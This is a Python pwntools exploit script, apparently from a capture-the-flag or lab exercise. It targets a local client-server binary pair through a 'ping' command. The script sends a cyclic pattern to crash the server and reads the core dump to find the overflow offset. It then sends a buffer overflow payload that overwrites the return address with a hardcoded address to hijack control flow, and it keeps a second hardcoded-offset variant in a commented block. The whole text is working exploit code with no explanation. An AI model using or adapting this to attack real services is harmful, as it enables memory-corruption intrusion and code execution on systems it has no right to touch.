from pwn import *

context.clear(arch= 'amd64')

hijackFlowAddr = 0x555555568a3b
manualServer = False     
crash = True
if crash:
        print("crashing ...")
        server = process(['bin/server'])
        client = process(['bin/client', '127.0.0.1', '1337'])

        # Generate a cyclic pattern so that we can auto-find the offset
        payload = cyclic(900)  
        payload = "ping " + payload
        client.sendline(payload)
        server.wait_for_close()
        #Get the core dump
        core = Coredump('baseDir/core')
        rip = hex(core.rip)
        faultAddr = hex(core.fault_addr)
        faultAddrLSB = faultAddr[-8:]
        client.close()
        server.close()  
        #sys.exit()   


if not manualServer:
        server = process(['bin/server'])

client = process(['bin/client', '127.0.0.1', '1337'])

print(faultAddrLSB)


exploit = cyclic(cyclic_find(int(faultAddrLSB, 16)) - 10)
exploit += "AAAAAAAAAA" + p64(hijackFlowAddr) 
exploit = "ping " + exploit

print len(exploit)
client.sendline(exploit)
if not manualServer:
        res = server.recvall(timeout=1)
        print res
"""
try:
	core = Coredump('baseDir/core')
except:
	print "no coredump"
"""
client.close()

if not manualServer:
        server.close()


""""

if not manualServer:
        server = process(['bin/server'])
client = process(['bin/client', '127.0.0.1', '1337'])


exploit = "A" * 227 + p64(hijackFlowAddr)
exploit = "ping " + exploit

print len(exploit)
client.sendline(exploit)

if not manualServer:
        res = server.recvall(timeout=1)
        print res
        
client.close()

if not manualServer:
        server.close()
"""



